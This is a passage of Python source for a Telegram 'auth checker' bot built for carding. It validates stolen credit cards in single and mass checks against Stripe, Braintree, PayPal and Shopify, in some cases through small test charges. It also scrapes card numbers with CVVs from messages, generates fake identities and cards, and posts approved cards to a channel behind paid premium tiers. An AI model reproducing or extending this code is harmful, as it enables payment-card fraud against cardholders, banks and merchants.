
    args = msg.text.split(None, 1)
    if len(args) < 2:
        return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a BIN to lookup
• Usage: `/bin <6-digit-bin>`

*Example*
`/bin 483318`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    bin_input = args[1].strip()
    # Extract digits only
    bin_digits = re.sub(r'[^\d]', '', bin_input)
    
    if len(bin_digits) < 6:
        return send_long_message(msg.chat.id, """
❌ *Invalid BIN* ❌

• BIN must be at least 6 digits
• Usage: `/bin <6-digit-bin>`

*Example*
`/bin 483318`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    processing = send_long_message(msg.chat.id, """
🔍 *BIN Lookup*

🔄 Looking up BIN information...
⏳ Please wait...""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def lookup_and_reply():
        try:
            bin_info = get_bin_info_for_bot(bin_digits)
            
            if not bin_info:
                edit_long_message(msg.chat.id, processing.message_id, f"""
❌ *BIN Lookup Failed* ❌

• Could not find information for BIN: `{bin_digits[:6]}`
• The BIN may be invalid or not in the database

✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
                return
            
            # Format the response
            result_message = f"""
✅ *BIN Lookup Result* ✅

🔢 *BIN*: `{bin_info['bin']}`
💳 *Brand*: {bin_info['brand']}
🏦 *Bank*: {bin_info['bank']}
🌍 *Country*: {bin_info['country']} {bin_info['emoji']}
💳 *Type*: {bin_info['type']}
⭐ *Level*: {bin_info['level']}

🔱 *Checked by @mhitzxg*
"""
            edit_long_message(msg.chat.id, processing.message_id, result_message, parse_mode='Markdown')
            
        except Exception as e:
            error_msg = f"""
❌ *BIN Lookup Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
            edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')

    threading.Thread(target=lookup_and_reply).start()

@bot.message_handler(commands=['fake'])
def fake_handler(msg):
    """Generate fake identity"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can generate identities

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    args = msg.text.split(None, 1)
    country_code = 'US'  # Default
    
    if len(args) >= 2:
        country_code = args[1].strip().upper()
        # Extract only letters (country code)
        country_code = re.sub(r'[^A-Z]', '', country_code)
        if not country_code:
            country_code = 'US'
    
    try:
        identity = generate_identity(country_code)
        send_long_message(msg.chat.id, identity, reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
❌ *Identity Generation Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['scr'])
def scr_handler(msg):
    """CC Scraper - Extract cards from messages"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can scrape cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please reply to a message containing cards
• Usage: Reply to a message with `/scr`

*Example*
Reply to a message with approved cards using `/scr`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    replied_text = msg.reply_to_message.text or msg.reply_to_message.caption or ""
    
    if not replied_text:
        return send_long_message(msg.chat.id, """
❌ *No Text Found* ❌

• The replied message doesn't contain any text
• Please reply to a message with card information

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    def scrape_and_reply():
        try:
            # Extract credit cards using the pattern from scr.py
            patterns = [r'(\d{13,19})[\|\s\/\-:]+(\d{1,2})[\|\s\/\-:]+(\d{2,4})[\|\s\/\-:]+(\d{3,4})']
            credit_cards = []
            
            for pattern in patterns:
                for match in re.finditer(pattern, replied_text):
                    card_number, month, year, cvv = match.groups()
                    card_number = re.sub(r'[\s\-]', '', card_number)
                    if 13 <= len(card_number) <= 19 and 1 <= int(month) <= 12 and len(cvv) >= 3:
                        year_digits = year[-2:]
                        credit_cards.append(f"{card_number}|{month.zfill(2)}|{year_digits}|{cvv}")
            
            # Remove duplicates
            credit_cards = list(dict.fromkeys(credit_cards))
            
            if not credit_cards:
                send_long_message(msg.chat.id, """
❌ *No Cards Found* ❌

• No valid credit cards found in the replied message
• Make sure the message contains cards in format: `number|mm|yy|cvv`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
                return
            
            # Format cards with BIN lookup for first card
            first_card = credit_cards[0]
            first_bin = first_card.split('|')[0][:6]
            bin_info = get_bin_info_for_bot(first_bin)
            
            # Format cards for easy copying
            formatted_cards = []
            for card in credit_cards:
                formatted_cards.append(f"`{card}`")
            
            if bin_info:
                brand = bin_info.get('brand', 'UNKNOWN')
                card_type = bin_info.get('type', 'UNKNOWN')
                level = bin_info.get('level', 'UNKNOWN')
                bank = bin_info.get('bank', '🏛')
                country = bin_info.get('country', 'Unknown')
                emoji = bin_info.get('emoji', '')
                info_line = f"{brand} - {card_type} - {level}"
            else:
                info_line = "UNKNOWN - UNKNOWN - UNKNOWN"
                bank = "🏛"
                country = "Unknown"
                emoji = ""
            
            result_message = f"""
✅ *Cards Scraped Successfully* ✅

🔢 *Found*: {len(credit_cards)} card(s)
🔢 *BIN*: {first_bin}

{chr(10).join(formatted_cards)}

📚 *Info*: {info_line}
🏦 *Bank*: {bank}
🌍 *Country*: {country} {emoji}

🔱 *Scraped by @mhitzxg*
"""
            send_long_message(msg.chat.id, result_message, reply_to_message_id=msg.message_id, parse_mode='Markdown')
            
        except Exception as e:
            error_msg = f"""
❌ *Scraping Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
            send_long_message(msg.chat.id, error_msg, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    threading.Thread(target=scrape_and_reply).start()

# ---------------- Bot Commands ---------------- #

@bot.message_handler(commands=['start'])
def start_handler(msg):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_id = msg.from_user.id
    
    # Don't auto-register, tell user to register first
    if not is_authorized(msg) and msg.chat.type == "private":
        welcome_note = "\n❓ *Use /register to get access*"
    else:
        welcome_note = ""
    
    welcome_message = f"""
★ *𝗠𝗛𝗜𝗧𝗭𝗫𝗚  𝗔𝗨𝗧𝗛  𝗖𝗛𝗘𝗖𝗞𝗘𝗥* ★

✨ *𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {msg.from_user.first_name or 'User'}!* ✨

📋 *Use the buttons below to navigate*

📌 *𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝘂𝘀*: {check_proxy_status()}

✨ *𝗳𝗼𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀*
📩 *𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @mhitzxg* 
❄️ *𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd*
{welcome_note}
"""
    
    # Create inline keyboard with buttons
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    # Single Check buttons
    keyboard.add(
        InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check")
    )
    
    # Mass Check buttons
    keyboard.add(
        InlineKeyboardButton("🔸 Mass Check", callback_data="show_mass_check")
    )
    
    # Tools buttons
    keyboard.add(
        InlineKeyboardButton("🛠️ Tools", callback_data="show_tools")
    )
    
    bot.send_message(msg.chat.id, welcome_message, reply_to_message_id=msg.message_id, parse_mode='Markdown', reply_markup=keyboard)

@bot.message_handler(commands=['cmds'])
def cmds_handler(msg):
    """Show all available commands - SIMPLIFIED VERSION"""
    try:
        user_id = msg.from_user.id
        
        # Simple commands list without complex database calls
        commands_message = """
🤖 *MHITZXG AUTH CHECKER BOT* 🤖

🛒 *CARD CHECKING COMMANDS* 🛒

• /ch - Check single card (Stripe Auth)
• /mch - Mass check cards (Stripe Auth)
• /br - Check single card (Braintree Auth) 
• /mbr - Mass check cards (Braintree Auth)
• /pp - Check single card (PayPal Charge $2)
• /mpp - Mass check cards (PayPal Charge $2)
• /sh - Check single card (Shopify Charge $13.98)
• /msh - Mass check cards (Shopify Charge $13.98)
• /st - Check single card (Stripe Charge $1)
• /mst - Mass check cards (Stripe Charge $1)
• /sk - Check single card (Stripe SK Charge $1)
• /msk - Check mass card (Stripe SK Charge $1)
• /vbv - VBV Lookup (Braintree)
• /mvbv - Mass VBV Lookup (Braintree)

🔍 *GATEWAY SCANNER* 🔍

• /url - Gateway Scanner (Scan URLs for payment gateways)

🎰 *CARD GENERATION* 🎰

• /gen - Generate cards (show in message)
• /gentxt - Generate cards (send as text file)

🔧 *UTILITY COMMANDS* 🔧

• /start - Start the bot
• /info - Your account info  
• /status - Bot statistics
• /subscription - Premium plans
• /register - Register free account

⚡ *Need Help?*
• Contact: @mhitzxg
• Powered by: @mhitzxg & @pr0xy_xd
"""

        send_long_message(msg.chat.id, commands_message, reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        print(f"Error in cmds_handler: {e}")
        # Fallback simple message
        simple_commands = """
🤖 *BOT COMMANDS* 🤖

• /ch - Stripe Auth
• /mch - Mass Stripe  
• /br - Braintree Auth
• /mbr - Mass Braintree
• /pp - PayPal Charge
• /mpp - Mass PayPal
• /sh - Shopify Charge
• /msh - Mass Shopify
• /st - Stripe Non-Sk Charge
• /mst - Stripe Mass Non-Sk Charge
• /sk - Stripe Sk Charge
• /msk - Stripe mass-sk Charge
• /vbv - VBV Lookup (Braintree)
• /mvbv - Mass VBV Lookup (Braintree)
• /gen - Generate Cards


📞 Contact @mhitzxg for help
"""
        send_long_message(msg.chat.id, simple_commands, reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['auth'])
def auth_user(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can authorize users
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    conn = None
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/auth <user_id>`
• Example: `/auth 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = int(parts[1])
        
        # Check if user is already authorized
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Cannot connect to database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
            
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        
        if result:
            return send_long_message(msg.chat.id, f"""
✅ *Already Authorized* ✅

• User `{user_id}` is already authorized
• No action needed""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        # Add user to free_users table
        try:
            # Try to get user info from Telegram
            user_chat = bot.get_chat(user_id)
            first_name = user_chat.first_name or "User"
        except:
            first_name = "User"
            
        if add_free_user(user_id, first_name):
            send_long_message(msg.chat.id, f"""
✅ *User Authorized* ✅

• Successfully authorized user: `{user_id}`
• User can now use the bot in private chats""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Failed to authorize user""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid User ID* ❌

• Please provide a valid numeric user ID
• Usage: `/auth 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    finally:
        if conn and conn.is_connected():
            conn.close()

# ---------------- Mass Check Handler ---------------- #

@bot.message_handler(commands=['mch', 'mbr', 'mpp', 'msh', 'mst', 'msk', 'mvbv'])
def mass_check_handler(msg):
    """Handle all mass check commands with format selection"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
🔰 *AUTHORIZATION REQUIRED* 🔰
 
• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for cooldown (10 minutes for free users)
    command = msg.text.split('@')[0].lower()
    if check_cooldown(msg.from_user.id, command):
        return send_long_message(msg.chat.id, """
⏰ *Cooldown Active* ⏰

• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please reply to a .txt file with /{command}
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """
❌ *No Valid Cards* ❌

• No valid card formats found in the file
• Please check the file format

*Valid format*
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""
❌ *Limit Exceeded* ❌

• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards

💰 *Upgrade To Premium* 💰

• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """
❌ *Too Many Cards* ❌

• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, command, 600)  # 10 minutes = 600 seconds

    # Map commands to gateway keys and functions
    command_map = {
        '/mch': ('mch', 'Stripe Auth', check_card_stripe),
        '/mbr': ('mbr', 'Braintree Auth', lambda cc: None),  # Placeholder, handled in fast_process_cards
        '/mpp': ('mpp', 'PayPal Charge', check_card_paypal),
        '/msh': ('msh', 'Shopify Charge', check_card_shopify),
        '/mst': ('mst', 'Stripe Charge', test_charge),
        '/msk': ('msk', 'Stripe Sk Charge', check_card_hosted),
        '/mvbv': ('mvbv', 'Mass VBV Lookup', check_card_vbv)
    }
    
    gateway_key, gateway_name, check_function = command_map.get(command, (None, None, None))
    
    if not gateway_key:
        return send_long_message(msg.chat.id, """
❌ *Invalid Command* ❌

• Available mass check commands:
• /mch - Mass Stripe Auth
• /mbr - Mass Braintree Auth
• /mpp - Mass PayPal Charge
• /msh - Mass Shopify Charge
• /msk - Mass Stripe SK Charge
• /mvbv - Mass VBV Lookup
• /mst - Mass Stripe Charge""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # 🚧 Maintenance checks for mass checks
    maintenance_map = {
        'mbr': BRAINTREE_MAINTENANCE,
        'mch': STRIPE_AUTH_MAINTENANCE,
        'mpp': PAYPAL_MAINTENANCE,
        'msh': SHOPIFY_MAINTENANCE,
        'mst': STRIPE_CHARGE_MAINTENANCE,
        'msk': STRIPE_SK_MAINTENANCE,
        'mvbv': VBV_MAINTENANCE
    }
    
    if maintenance_map.get(gateway_key, False):
        gateway_display_names = {
            'mbr': 'Braintree Auth',
            'mch': 'Stripe Auth',
            'mpp': 'PayPal Charge',
            'msh': 'Shopify Charge',
            'mst': 'Stripe Charge',
            'msk': 'Stripe SK Charge',
            'mvbv': 'VBV Lookup'
        }
        return send_long_message(msg.chat.id, f"""
🚧 *{gateway_display_names.get(gateway_key, 'Gateway')} Under Maintenance* 🚧

• The {gateway_display_names.get(gateway_key, 'gateway')} is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Start mass check with format selection
    start_mass_check_with_format_selection(msg, gateway_key, gateway_name, cc_lines, check_function)

# ---------------- Single Check Handlers ---------------- #

@bot.message_handler(commands=['sh'])
def sh_handler(msg):
    """Check single card using Shopify gateway"""
    # 🚧 Maintenance check
    if SHOPIFY_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *Shopify Gateway Under Maintenance* 🚧

• The Shopify charge gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "sh"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/sh 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/sh <card_details>`

*Valid format*
`/sh 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /sh

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "sh", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - Shopify Charge 13.98$*

🔮 Initializing Shopify Gateway...
🔄 Connecting to Shopify API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_shopify_loading(message_id, progress, status):
        """Update Shopify loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Shopify Charge 13.98$*

🔮 {status}
🔄 Processing your request
📡 Contacting Shopify gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_shopify_loading(processing.message_id, 20, "Initializing Shopify...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_shopify_loading(processing.message_id, 40, "Connecting to Shopify API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_shopify_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_shopify_loading(processing.message_id, 80, "Processing Shopify request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_shopify_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_shopify(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n🔌 Proxy: {proxy_status}\n🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
########################################### BRAINTREE ###########################################
@bot.message_handler(commands=['br'])
def br_handler(msg):
    """Check single card using Braintree gateway"""
    # 🚧 Maintenance check
    if BRAINTREE_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *Braintree Gateway Under Maintenance* 🚧

• The Braintree auth gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "br"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/br 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/br <card_details>`

*Valid format*
`/br 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /br

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "br", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - Braintree Auth - 1*

🔮 Initializing Braintree Gateway...
🔄 Connecting to Braintree API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_braintree_loading(message_id, progress, status):
        """Update Braintree loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Braintree Auth - 1*

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_braintree_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_braintree_loading(processing.message_id, 40, "Connecting to Braintree API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_braintree_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_braintree_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_braintree_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            # Use Braintree checker instead of regular check_card
            import asyncio
            from braintree_checker import check_card_braintree
            
            # Create new event loop for async call
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(check_card_braintree(cc))
            loop.close()
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱 𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
################################### STRIPE AUTH #############################
@bot.message_handler(commands=['ch'])
def ch_handler(msg):
    """Check single card using Stripe gateway"""
    # 🚧 Maintenance check
    if STRIPE_AUTH_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *Stripe Auth Gateway Under Maintenance* 🚧

• The Stripe auth gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/ch <card_details>`

*Valid format*
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
